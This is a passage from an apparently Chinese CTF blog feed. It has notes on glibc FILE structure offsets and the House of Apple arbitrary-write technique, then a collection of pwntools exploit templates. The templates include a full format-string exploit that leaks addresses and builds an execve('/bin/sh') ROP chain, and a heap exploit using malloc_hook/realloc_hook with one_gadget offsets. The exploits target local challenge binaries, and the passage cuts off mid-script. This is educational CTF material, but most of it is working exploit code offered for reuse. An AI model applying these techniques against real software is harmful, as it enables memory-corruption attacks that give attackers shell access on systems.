ignore it.  */</span></span><br><span class="line">  <span class="keyword">return</span> c;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="结构体布局"><a href="#结构体布局" class="headerlink" title="结构体布局"></a>结构体布局</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">amd64：</span><br><span class="line">FILE + <span class="number">0XF0</span> = overflow_buf;</span><br><span class="line">FILE + <span class="number">0X1F0</span> = overflow_buf结尾的下一个;</span><br><span class="line">FILE + <span class="number">0</span>X</span><br><span class="line">FILE:</span><br><span class="line"><span class="number">0x0</span>:<span class="string">&#x27;_flags&#x27;</span>,</span><br><span class="line"><span class="number">0x8</span>:<span class="string">&#x27;_IO_read_ptr&#x27;</span>,</span><br><span class="line"><span class="number">0x10</span>:<span class="string">&#x27;_IO_read_end&#x27;</span>,</span><br><span class="line"><span class="number">0x18</span>:<span class="string">&#x27;_IO_read_base&#x27;</span>,</span><br><span class="line"><span class="number">0x20</span>:<span class="string">&#x27;_IO_write_base&#x27;</span>,</span><br><span class="line"><span class="number">0x28</span>:<span class="string">&#x27;_IO_write_ptr&#x27;</span>,</span><br><span class="line"><span class="number">0x30</span>:<span class="string">&#x27;_IO_write_end&#x27;</span>,</span><br><span class="line"><span class="number">0x38</span>:<span class="string">&#x27;_IO_buf_base&#x27;</span>,</span><br><span class="line"><span class="number">0x40</span>:<span class="string">&#x27;_IO_buf_end&#x27;</span>,</span><br><span class="line"><span class="number">0x48</span>:<span class="string">&#x27;_IO_save_base&#x27;</span>,</span><br><span class="line"><span class="number">0x50</span>:<span class="string">&#x27;_IO_backup_base&#x27;</span>,</span><br><span class="line"><span class="number">0x58</span>:<span class="string">&#x27;_IO_save_end&#x27;</span>,</span><br><span class="line"><span class="number">0x60</span>:<span class="string">&#x27;_markers&#x27;</span>,</span><br><span class="line"><span class="number">0x68</span>:<span class="string">&#x27;_chain&#x27;</span>,</span><br><span class="line"><span class="number">0x70</span>:<span class="string">&#x27;_fileno&#x27;</span>,</span><br><span class="line"><span class="number">0x74</span>:<span class="string">&#x27;_flags2&#x27;</span>,</span><br><span class="line"><span class="number">0x78</span>:<span class="string">&#x27;_old_offset&#x27;</span>,</span><br><span class="line"><span class="number">0x80</span>:<span class="string">&#x27;_cur_column&#x27;</span>,</span><br><span class="line"><span class="number">0x82</span>:<span class="string">&#x27;_vtable_offset&#x27;</span>,</span><br><span class="line"><span class="number">0x83</span>:<span class="string">&#x27;_shortbuf&#x27;</span>,</span><br><span class="line"><span class="number">0x88</span>:<span class="string">&#x27;_lock&#x27;</span>,</span><br><span class="line"><span class="number">0x90</span>:<span class="string">&#x27;_offset&#x27;</span>,</span><br><span class="line"><span class="number">0x98</span>:<span class="string">&#x27;_codecvt&#x27;</span>,</span><br><span class="line"><span class="number">0xa0</span>:<span class="string">&#x27;_wide_data&#x27;</span>,</span><br><span class="line"><span class="number">0xa8</span>:<span class="string">&#x27;_freeres_list&#x27;</span>,</span><br><span class="line"><span class="number">0xb0</span>:<span class="string">&#x27;_freeres_buf&#x27;</span>,</span><br><span class="line"><span class="number">0xb8</span>:<span class="string">&#x27;__pad5&#x27;</span>,</span><br><span class="line"><span class="number">0xc0</span>:<span class="string">&#x27;_mode&#x27;</span>,</span><br><span class="line"><span class="number">0xc4</span>:<span class="string">&#x27;_unused2&#x27;</span>,</span><br><span class="line"><span class="number">0xd8</span>:<span class="string">&#x27;vtable&#x27;</span></span><br></pre></td></tr></table></figure>

<h2 id="实现任意地址写"><a href="#实现任意地址写" class="headerlink" title="实现任意地址写"></a>实现任意地址写</h2><h3 id="条件"><a href="#条件" class="headerlink" title="条件"></a>条件</h3><blockquote>
<p>1.<code>f-&gt;_flags2 &amp; _IO_FLAGS2_USER_WBUF = 1</code></p>
<p>2.<code>fp-&gt;_mode &lt;= 0</code></p>
<p>3.<code>fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base</code></p>
</blockquote>
<h3 id="结果"><a href="#结果" class="headerlink" title="结果"></a>结果</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">FILE + <span class="number">0XD8</span> = _IO_wstrn_jumps</span><br><span class="line">FILE + <span class="number">0XA0</span> = _wide_data(改为目的地址)</span><br><span class="line">FILE + <span class="number">0XF0</span> = 想要的值</span><br><span class="line">_wide_data+<span class="number">0X0</span>=想要的值</span><br><span class="line">_wide_data+<span class="number">0X8</span>=想要的值</span><br><span class="line">_wide_data+<span class="number">0X10</span>=想要的值</span><br><span class="line">_wide_data+<span class="number">0X18</span>=*(FILE + <span class="number">0X1F0</span>)</span><br></pre></td></tr></table></figure>

<h2 id="DEMO"><a href="#DEMO" class="headerlink" title="DEMO"></a>DEMO</h2><h1 id="APPLE2"><a href="#APPLE2" class="headerlink" title="APPLE2"></a>APPLE2</h1><blockquote>
<p>主要是几条调用链</p>
<p>[<a href="https://bbs.kanxue.com/thread-273832.htm#msg_header_h1_0">原创] House of apple 一种新的glibc中IO攻击方法 (2)-Pwn-看雪-安全社区|安全招聘|kanxue.com</a></p>
</blockquote>
<h1 id="APPLE3"><a href="#APPLE3" class="headerlink" title="APPLE3"></a>APPLE3</h1><blockquote>
<p>有点难，对宽字符处理方式一无所知，有机会再学吧，嘻嘻。</p>
</blockquote>
]]></content>
      <categories>
        <category>userpwn</category>
      </categories>
      <tags>
        <tag>userpwn</tag>
      </tags>
  </entry>
  <entry>
    <title>pwn模板整理</title>
    <url>/2024/09/15/userpwn/all/</url>
    <content><![CDATA[<h2 id="ANY"><a href="#ANY" class="headerlink" title="ANY"></a>ANY</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> * </span><br><span class="line"><span class="keyword">from</span> pwncli <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span>*</span><br><span class="line">io = process(<span class="string">&quot;./ttt&quot;</span>)</span><br><span class="line">context.terminal = [<span class="string">&quot;tmux&quot;</span>,<span class="string">&quot;splitw&quot;</span>,<span class="string">&quot;-h&quot;</span>]</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">ARROW = <span class="string">&#x27; ============================================&gt; &#x27;</span> </span><br><span class="line">s       = <span class="keyword">lambda</span> data               :io.send(data) </span><br><span class="line">sa      = <span class="keyword">lambda</span> delim,data         :io.sendafter(delim, data)</span><br><span class="line">sl      = <span class="keyword">lambda</span> data               :io.sendline(data)</span><br><span class="line">sla     = <span class="keyword">lambda</span> delim,data         :io.sendlineafter(delim, data)</span><br><span class="line">rv      = <span class="keyword">lambda</span> num          	    :io.recv(num)</span><br><span class="line">rec      = <span class="keyword">lambda</span>           	        :io.recv()</span><br><span class="line">rl      = <span class="keyword">lambda</span>                    :io.recvline()</span><br><span class="line">ru      = <span class="keyword">lambda</span> delims             :io.recvuntil(delims)</span><br><span class="line">info    = <span class="keyword">lambda</span> tag, addr          :log.info(tag + <span class="string">&quot; -&gt; &quot;</span> + <span class="built_in">hex</span>(addr))</span><br><span class="line">ia	= <span class="keyword">lambda</span>                    :io.interactive()</span><br><span class="line">li      = <span class="keyword">lambda</span> tag, x             :<span class="built_in">print</span>(<span class="string">&quot;\x1b[1;38;5;214m&quot;</span> + tag + ARROW + <span class="string">&quot;\x1b[0m&quot;</span> + <span class="string">&#x27;\x1b[01;38;5;214m&#x27;</span> + x + <span class="string">&#x27;\x1b[0m&#x27;</span>)</span><br><span class="line">ll      = <span class="keyword">lambda</span> x                  :<span class="built_in">print</span>(<span class="string">&#x27;\x1b[01;38;5;1m&#x27;</span> + x + <span class="string">&#x27;\x1b[0m&#x27;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="fmtstr"><a href="#fmtstr" class="headerlink" title="fmtstr"></a>fmtstr</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">getadd</span>(<span class="params">fmt</span>):</span><br><span class="line">    sa(<span class="string">b&#x27;First, please tell me your name.\n&#x27;</span>,fmt)</span><br><span class="line">    byte_stream = io.recvuntil(<span class="string">b&quot;!&quot;</span>)</span><br><span class="line">    split_parts = byte_stream.split(<span class="string">b&quot;&gt;&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> split_parts</span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> * </span><br><span class="line"><span class="keyword">from</span> pwncli <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span>*</span><br><span class="line">io = process(<span class="string">&quot;./vuln&quot;</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./libc.so.6&quot;</span>)</span><br><span class="line"><span class="comment">#io = remote(&quot;node5.buuoj.cn&quot;,25651)</span></span><br><span class="line">context.terminal = [<span class="string">&quot;tmux&quot;</span>,<span class="string">&quot;splitw&quot;</span>,<span class="string">&quot;-h&quot;</span>]</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">ARROW = <span class="string">&#x27; ============================================&gt; &#x27;</span> </span><br><span class="line">s       = <span class="keyword">lambda</span> data               :io.send(data) </span><br><span class="line">sa      = <span class="keyword">lambda</span> delim,data         :io.sendafter(delim, data)</span><br><span class="line">sl      = <span class="keyword">lambda</span> data               :io.sendline(data)</span><br><span class="line">sla     = <span class="keyword">lambda</span> delim,data         :io.sendlineafter(delim, data)</span><br><span class="line">rv      = <span class="keyword">lambda</span> num          	    :io.recv(num)</span><br><span class="line">rec      = <span class="keyword">lambda</span>           	        :io.recv()</span><br><span class="line">rl      = <span class="keyword">lambda</span>                    :io.recvline()</span><br><span class="line">ru      = <span class="keyword">lambda</span> delims             :io.recvuntil(delims)</span><br><span class="line">info    = <span class="keyword">lambda</span> tag, addr          :log.info(tag + <span class="string">&quot; -&gt; &quot;</span> + <span class="built_in">hex</span>(addr))</span><br><span class="line">ia	= <span class="keyword">lambda</span>                    :io.interactive()</span><br><span class="line">li      = <span class="keyword">lambda</span> tag, x             :<span class="built_in">print</span>(<span class="string">&quot;\x1b[1;38;5;214m&quot;</span> + tag + ARROW + <span class="string">&quot;\x1b[0m&quot;</span> + <span class="string">&#x27;\x1b[01;38;5;214m&#x27;</span> + x + <span class="string">&#x27;\x1b[0m&#x27;</span>)</span><br><span class="line">ll      = <span class="keyword">lambda</span> x                  :<span class="built_in">print</span>(<span class="string">&#x27;\x1b[01;38;5;1m&#x27;</span> + x + <span class="string">&#x27;\x1b[0m&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getadd</span>(<span class="params">fmt</span>):</span><br><span class="line">    sla(<span class="string">&quot;what&#x27;s your favourite food: &quot;</span>,fmt)</span><br><span class="line">    ru(<span class="string">b&#x27;You like &#x27;</span>)</span><br><span class="line">    byte_stream = io.recvuntil(<span class="string">b&quot;!&quot;</span>)[:-<span class="number">1</span>]</span><br><span class="line">    split_parts = byte_stream.split(<span class="string">b&quot;&gt;&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> split_parts</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pr</span>(<span class="params">add1,add2,canary,stackadd</span>):</span><br><span class="line">    li(<span class="string">&quot;libcbase&quot;</span>,<span class="built_in">hex</span>(add1))</span><br><span class="line">    li(<span class="string">&quot;probase&quot;</span>,<span class="built_in">hex</span>(add2))</span><br><span class="line">    li(<span class="string">&quot;canary&quot;</span>,<span class="built_in">hex</span>(canary))</span><br><span class="line">    li(<span class="string">&quot;stack&quot;</span>,<span class="built_in">hex</span>(stackadd))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">change</span>(<span class="params">front,num,position,by</span>):</span><br><span class="line">    <span class="keyword">if</span> by == <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">if</span> num != <span class="number">0</span>:</span><br><span class="line">            fmt = <span class="string">f&quot;%<span class="subst">&#123;num&#125;</span>c%<span class="subst">&#123;position&#125;</span>$hhn&quot;</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            fmt = <span class="string">f&quot;%<span class="subst">&#123;position&#125;</span>$hhn&quot;</span></span><br><span class="line">    <span class="keyword">if</span> by == <span class="number">2</span>:</span><br><span class="line">        <span class="keyword">if</span> num != <span class="number">0</span>:</span><br><span class="line">            fmt = <span class="string">f&quot;%<span class="subst">&#123;num&#125;</span>c%<span class="subst">&#123;position&#125;</span>$hn&quot;</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            fmt = <span class="string">f&quot;%<span class="subst">&#123;position&#125;</span>$hn&quot;</span></span><br><span class="line">    sla(front,fmt.encode())</span><br><span class="line"></span><br><span class="line">sa(<span class="string">b&#x27;Give me your name:&#x27;</span>,<span class="number">32</span>*<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">ru(<span class="string">b&#x27;Hello &#x27;</span>)</span><br><span class="line">adds = getadd(<span class="string">b&#x27;%8$p&gt;%9$p&gt;%11$p!&#x27;</span>)</span><br><span class="line">probase = <span class="built_in">int</span>(adds[<span class="number">0</span>],<span class="number">16</span>) + <span class="number">0x5600b5200000</span> - <span class="number">0x5600b5200b60</span></span><br><span class="line">libcbase = <span class="built_in">int</span>(adds[<span class="number">1</span>],<span class="number">16</span>) + <span class="number">0x7ff87b3d0000</span> - <span class="number">0x7ff87b3f0840</span></span><br><span class="line">rbp = <span class="built_in">int</span>(adds[<span class="number">2</span>],<span class="number">16</span>) + <span class="number">0x7fffd13d3d80</span> - <span class="number">0x7fffd13d3e68</span>  </span><br><span class="line">countadd = rbp - <span class="number">0xc</span></span><br><span class="line">pr(libcbase,probase,<span class="number">0x0</span>,rbp)</span><br><span class="line"><span class="comment">## 改次数</span></span><br><span class="line">sleep(<span class="number">0.5</span>)</span><br><span class="line">change(<span class="string">b&quot;what&#x27;s your favourite food: &quot;</span>,(countadd&amp;<span class="number">0xffff</span>),<span class="number">11</span>,<span class="number">2</span>)</span><br><span class="line">change(<span class="string">b&quot;what&#x27;s your favourite food: &quot;</span>,(<span class="number">0x100</span>-<span class="number">136</span>),<span class="number">37</span>,<span class="number">2</span>)</span><br><span class="line">sleep(<span class="number">0.5</span>)</span><br><span class="line"><span class="comment">## ret地址</span></span><br><span class="line">rdi = libcbase+ <span class="number">0x0000000000021112</span></span><br><span class="line">rsi = libcbase + <span class="number">0x00000000000202f8</span></span><br><span class="line">rdx = libcbase + <span class="number">0x0000000000001b92</span></span><br><span class="line">binsh = libcbase + <span class="number">0x000000000018ce57</span></span><br><span class="line">exc = libcbase + elf.sym[<span class="string">&quot;execve&quot;</span>]</span><br><span class="line"><span class="comment">## 使用25-39</span></span><br><span class="line"></span><br><span class="line">ret1 = rbp + <span class="number">8</span></span><br><span class="line">ret1value = ret1+<span class="number">8</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(io)</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">    change(<span class="string">b&quot;what&#x27;s your favourite food: &quot;</span>,((ret1+<span class="number">2</span>*i)&amp;<span class="number">0xffff</span>),<span class="number">25</span>,<span class="number">2</span>) <span class="comment">##改目的地址</span></span><br><span class="line">    change(<span class="string">b&quot;what&#x27;s your favourite food: &quot;</span>,((rdi&gt;&gt;(<span class="number">16</span>*i))&amp;<span class="number">0xffff</span>),<span class="number">39</span>,<span class="number">2</span>) <span class="comment">##改目的地址的值</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">    change(<span class="string">b&quot;what&#x27;s your favourite food: &quot;</span>,((ret1value+<span class="number">2</span>*i)&amp;<span class="number">0xffff</span>),<span class="number">25</span>,<span class="number">2</span>) <span class="comment">##改目的地址</span></span><br><span class="line">    change(<span class="string">b&quot;what&#x27;s your favourite food: &quot;</span>,((binsh&gt;&gt;(<span class="number">16</span>*i))&amp;<span class="number">0xffff</span>),<span class="number">39</span>,<span class="number">2</span>) <span class="comment">##改目的地址的值</span></span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line"><span class="comment">## 改rsi</span></span><br><span class="line">ret2 = ret1value + <span class="number">8</span></span><br><span class="line">ret2value = ret2 + <span class="number">8</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">for i in range(4):</span></span><br><span class="line"><span class="string">    change(b&quot;what&#x27;s your favourite food: &quot;,((ret2+2*i)&amp;0xffff),25,2)</span></span><br><span class="line"><span class="string">    change(b&quot;what&#x27;s your favourite food: &quot;,((rsi&gt;&gt;(16*i))&amp;0xffff),39,2)</span></span><br><span class="line"><span class="string">for i in range(4):</span></span><br><span class="line"><span class="string">    change(b&quot;what&#x27;s your favourite food: &quot;,((ret2value+2*i)&amp;0xffff),25,2)</span></span><br><span class="line"><span class="string">    change(b&quot;what&#x27;s your favourite food: &quot;,((0x0&gt;&gt;(16*i))&amp;0xffff),39,2)</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">    change(<span class="string">b&quot;what&#x27;s your favourite food: &quot;</span>,((ret2+i)&amp;<span class="number">0xff</span>),<span class="number">25</span>,<span class="number">1</span>)</span><br><span class="line">    change(<span class="string">b&quot;what&#x27;s your favourite food: &quot;</span>,((rsi&gt;&gt;(<span class="number">8</span>*i))&amp;<span class="number">0xff</span>),<span class="number">39</span>,<span class="number">1</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">    change(<span class="string">b&quot;what&#x27;s your favourite food: &quot;</span>,((ret2value+i)&amp;<span class="number">0xff</span>),<span class="number">25</span>,<span class="number">1</span>)</span><br><span class="line">    change(<span class="string">b&quot;what&#x27;s your favourite food: &quot;</span>,((<span class="number">0x0</span>&gt;&gt;(<span class="number">8</span>*i))&amp;<span class="number">0xff</span>),<span class="number">39</span>,<span class="number">1</span>)</span><br><span class="line"><span class="comment">## 改rdx</span></span><br><span class="line">ret3 = ret2value + <span class="number">8</span></span><br><span class="line">ret3value = ret3 + <span class="number">8</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">for i in range(4):</span></span><br><span class="line"><span class="string">    change(b&quot;what&#x27;s your favourite food: &quot;,((ret3+2*i)&amp;0xffff),25,2)</span></span><br><span class="line"><span class="string">    change(b&quot;what&#x27;s your favourite food: &quot;,((rdx&gt;&gt;(16*i))&amp;0xffff),39,2)</span></span><br><span class="line"><span class="string">for i in range(4):</span></span><br><span class="line"><span class="string">    change(b&quot;what&#x27;s your favourite food: &quot;,((ret3value+2*i)&amp;0xffff),25,2)</span></span><br><span class="line"><span class="string">    change(b&quot;what&#x27;s your favourite food: &quot;,((0x0&gt;&gt;(16*i))&amp;0xffff),39,2)</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">    change(<span class="string">b&quot;what&#x27;s your favourite food: &quot;</span>,((ret3+i)&amp;<span class="number">0xff</span>),<span class="number">25</span>,<span class="number">1</span>)</span><br><span class="line">    change(<span class="string">b&quot;what&#x27;s your favourite food: &quot;</span>,((rdx&gt;&gt;(<span class="number">8</span>*i))&amp;<span class="number">0xff</span>),<span class="number">39</span>,<span class="number">1</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">    change(<span class="string">b&quot;what&#x27;s your favourite food: &quot;</span>,((ret3value+i)&amp;<span class="number">0xff</span>),<span class="number">25</span>,<span class="number">1</span>)</span><br><span class="line">    change(<span class="string">b&quot;what&#x27;s your favourite food: &quot;</span>,((<span class="number">0x0</span>&gt;&gt;(<span class="number">8</span>*i))&amp;<span class="number">0xff</span>),<span class="number">39</span>,<span class="number">1</span>)</span><br><span class="line"><span class="comment">##改sys</span></span><br><span class="line">ret4 = ret3value + <span class="number">8</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">for i in range(4):</span></span><br><span class="line"><span class="string">    change(b&quot;what&#x27;s your favourite food: &quot;,((ret4+2*i)&amp;0xffff),25,2)</span></span><br><span class="line"><span class="string">    change(b&quot;what&#x27;s your favourite food: &quot;,((exc&gt;&gt;(16*i))&amp;0xffff),39,2)</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">    change(<span class="string">b&quot;what&#x27;s your favourite food: &quot;</span>,((ret4+i)&amp;<span class="number">0xff</span>),<span class="number">25</span>,<span class="number">1</span>)</span><br><span class="line">    change(<span class="string">b&quot;what&#x27;s your favourite food: &quot;</span>,((exc&gt;&gt;(<span class="number">8</span>*i))&amp;<span class="number">0xff</span>),<span class="number">39</span>,<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">23</span>):</span><br><span class="line">    sla(<span class="string">b&quot;what&#x27;s your favourite food: &quot;</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">io.interactive()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h2 id="pr"><a href="#pr" class="headerlink" title="pr"></a>pr</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">pr</span>(<span class="params">add1,add2,canary,stackadd</span>):</span><br><span class="line">    li(<span class="string">&quot;libcbase&quot;</span>,<span class="built_in">hex</span>(add1))</span><br><span class="line">    li(<span class="string">&quot;probase&quot;</span>,<span class="built_in">hex</span>(add2))</span><br><span class="line">    li(<span class="string">&quot;canary&quot;</span>,<span class="built_in">hex</span>(canary))</span><br><span class="line">    li(<span class="string">&quot;stack&quot;</span>,<span class="built_in">hex</span>(stackadd))</span><br></pre></td></tr></table></figure>

<h2 id="rellochook-mallochook"><a href="#rellochook-mallochook" class="headerlink" title="rellochook+mallochook"></a>rellochook+mallochook</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> * </span><br><span class="line"><span class="keyword">from</span> pwncli <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span>*</span><br><span class="line">io = process(<span class="string">&quot;./xueba&quot;</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./libc-2.23.so&quot;</span>)</span><br><span class="line">context.terminal = [<span class="string">&quot;tmux&quot;</span>,<span class="string">&quot;splitw&quot;</span>,<span class="string">&quot;-h&quot;</span>]</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">ARROW = <span class="string">&#x27; ============================================&gt; &#x27;</span> </span><br><span class="line">s       = <span class="keyword">lambda</span> data               :io.send(data) </span><br><span class="line">sa      = <span class="keyword">lambda</span> delim,data         :io.sendafter(delim, data)</span><br><span class="line">sl      = <span class="keyword">lambda</span> data               :io.sendline(data)</span><br><span class="line">sla     = <span class="keyword">lambda</span> delim,data         :io.sendlineafter(delim, data)</span><br><span class="line">rv      = <span class="keyword">lambda</span> num          	    :io.recv(num)</span><br><span class="line">rec      = <span class="keyword">lambda</span>           	        :io.recv()</span><br><span class="line">rl      = <span class="keyword">lambda</span>                    :io.recvline()</span><br><span class="line">ru      = <span class="keyword">lambda</span> delims             :io.recvuntil(delims)</span><br><span class="line">info    = <span class="keyword">lambda</span> tag, addr          :log.info(tag + <span class="string">&quot; -&gt; &quot;</span> + <span class="built_in">hex</span>(addr))</span><br><span class="line">ia	= <span class="keyword">lambda</span>                    :io.interactive()</span><br><span class="line">li      = <span class="keyword">lambda</span> tag, x             :<span class="built_in">print</span>(<span class="string">&quot;\x1b[1;38;5;214m&quot;</span> + tag + ARROW + <span class="string">&quot;\x1b[0m&quot;</span> + <span class="string">&#x27;\x1b[01;38;5;214m&#x27;</span> + x + <span class="string">&#x27;\x1b[0m&#x27;</span>)</span><br><span class="line">ll      = <span class="keyword">lambda</span> x                  :<span class="built_in">print</span>(<span class="string">&#x27;\x1b[01;38;5;1m&#x27;</span> + x + <span class="string">&#x27;\x1b[0m&#x27;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cmd</span>(<span class="params">index</span>):</span><br><span class="line">    sla(<span class="string">&quot;5.Exit\n&quot;</span>,<span class="built_in">str</span>(index).encode())</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cre</span>(<span class="params">size,note,chunkcon</span>):</span><br><span class="line">    cmd(<span class="number">1</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;How long is your note?\n&#x27;</span>,<span class="built_in">str</span>(size).encode())</span><br><span class="line">    sa(<span class="string">b&#x27;Input your note name and note content:&#x27;</span>,note)</span><br><span class="line">    sleep(<span class="number">0.5</span>)</span><br><span class="line">    s(chunkcon)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">index</span>):</span><br><span class="line">    cmd(<span class="number">2</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;Index:\n&#x27;</span>,<span class="built_in">str</span>(index).encode())</span><br><span class="line">    ru(<span class="string">b&#x27;Name &#x27;</span>)</span><br><span class="line">    name = ru(<span class="string">&quot;\n&quot;</span>).strip()</span><br><span class="line">    ru(<span class="string">b&#x27;Content:&#x27;</span>)</span><br><span class="line">    con = ru(<span class="string">&quot;\n&quot;</span>).strip()</span><br><span class="line">    <span class="keyword">return</span> name,con</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">de</span>(<span class="params">index</span>):</span><br><span class="line">    cmd(<span class="number">3</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;Index:\n&#x27;</span>,<span class="built_in">str</span>(index).encode())</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">change</span>(<span class="params">index,letter,last</span>):</span><br><span class="line">    cmd(<span class="number">4</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;Index:\n&#x27;</span>,<span class="built_in">str</span>(index).encode())</span><br><span class="line">    sa(<span class="string">b&#x27;Which letter do you want to change?\n&#x27;</span>,letter)</span><br><span class="line">    s(last)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ex</span>():</span><br><span class="line">    cmd(<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line">cre(<span class="number">600</span>,<span class="number">16</span>*<span class="string">b&#x27;a&#x27;</span>+p32(<span class="number">0x1</span>)+<span class="string">b&#x27;\x00&#x27;</span>,<span class="number">8</span>*<span class="string">b&#x27;b&#x27;</span>) <span class="comment">#index = 0</span></span><br><span class="line">cre(<span class="number">0x67</span>,<span class="number">16</span>*<span class="string">b&#x27;a&#x27;</span>+p32(<span class="number">0x1</span>)+<span class="string">b&#x27;\x00&#x27;</span>,<span class="number">8</span>*<span class="string">b&#x27;b&#x27;</span>) <span class="comment">#index = 1 </span></span><br><span class="line">de(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">change(<span class="number">0</span>,<span class="string">b&#x27;\x00&#x27;</span>,<span class="string">b&#x27;\x01&#x27;</span>)</span><br><span class="line">name,con = show(<span class="number">0</span>)</span><br><span class="line">libcbase = u64(con.ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>)) + <span class="number">0x7f023dc0f000</span> - <span class="number">0x7f023dfd3b78</span></span><br><span class="line">li(<span class="string">&quot;libcbase&quot;</span>,<span class="built_in">hex</span>(libcbase))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">cre(<span class="number">0x67</span>,<span class="number">16</span>*<span class="string">b&#x27;a&#x27;</span>+p32(<span class="number">0x1</span>)+<span class="string">b&#x27;\x00&#x27;</span>,<span class="number">8</span>*<span class="string">b&#x27;b&#x27;</span>) <span class="comment">#index = 2</span></span><br><span class="line">cre(<span class="number">0x88</span>,<span class="number">16</span>*<span class="string">b&#x27;a&#x27;</span>+p32(<span class="number">0x1</span>)+<span class="string">b&#x27;\x00&#x27;</span>,<span class="number">8</span>*<span class="string">b&#x27;b&#x27;</span>) <span class="comment">#index = 3(pro)</span></span><br><span class="line">de(<span class="number">1</span>)</span><br><span class="line">de(<span class="number">2</span>)</span><br><span class="line">change(<span class="number">1</span>,<span class="string">b&#x27;\x00&#x27;</span>,<span class="string">b&#x27;\x01&#x27;</span>)</span><br><span class="line">de(<span class="number">1</span>)</span><br><span class="line">de(<span class="number">3</span>)</span><br><span class="line">__libc_reallocadd = libcbase + elf.symbols[<span class="string">&quot;__libc_realloc&quot;</span>]</span><br><span class="line">one = [libcbase + <span class="number">0x4526a</span>,libcbase +<span class="number">0xf02a4</span> ,libcbase +<span class="number">0xf1147</span>]</span><br><span class="line">cre(<span class="number">0x67</span>,<span class="number">16</span>*<span class="string">b&#x27;a&#x27;</span>+p32(<span class="number">0x1</span>)+<span class="string">b&#x27;\x00&#x27;</span>,p64(libcbase + <span class="number">0x7f57acdb3af5</span>-<span class="number">0x8</span>-<span 